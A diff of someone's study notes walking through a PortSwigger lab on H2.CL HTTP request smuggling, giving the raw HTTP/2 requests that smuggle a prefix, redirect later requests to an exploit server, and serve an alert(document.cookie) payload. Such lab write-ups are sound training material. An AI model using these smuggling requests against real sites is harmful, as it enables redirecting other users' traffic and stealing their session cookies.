@@ -434,5 +434,84 @@ Cookie: session=eiVlUrLVr93i4N4PmuH0J2fKcumc6Hi9
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d71683aa-c5c9-4416-bd10-6a46a388629c)
 
 
+**H2.CL Request Smuggling (turn off update content length)**
+
+
+```
+POST / HTTP/2
+Host: 0a130085036f6110833823da00be0008.web-security-academy.net
+Content-Length: 0
+
+SMUGGLED
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fd33dc7f-18c0-41ba-bb7c-2f882e599acb)
+
+
+• Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix. 
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 
+
+Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header: 
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/57286361-598c-4808-89b8-5d87e80dd618)
+
+
+
+
+
+
+
+
+
+
+• Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host. 
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 
+
+```
+POST / HTTP/2
+Host: 0a130085036f6110833823da00be0008.web-security-academy.net
+Content-Length: 60
+
+GET /resources HTTP/1.1
+Host: foo
+Content-Length: 5
+
+x=1
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/30ee1e02-8b2f-4099-973e-2e664aebacda)
+
+
+
+
+
+
+Go to the exploit server and change the file path to `/resources`. In the body, enter the payload `alert(document.cookie)` then store the exploit.
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 
+
+
+Resend and confirm that you a redirected to the exploit server 
+```
+POST / HTTP/2
+Host: 0a130085036f6110833823da00be0008.web-security-academy.net
+Content-Length: 116
+
+GET /resources HTTP/1.1
+Host: exploit-0ad50048033961258315229901bc0095.exploit-server.net/resources
+Content-Length: 5
+
+x=1
+```
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b59eb779-1305-4f65-b268-988420d01a95)
+
+
+
+
+
+
+
 
 
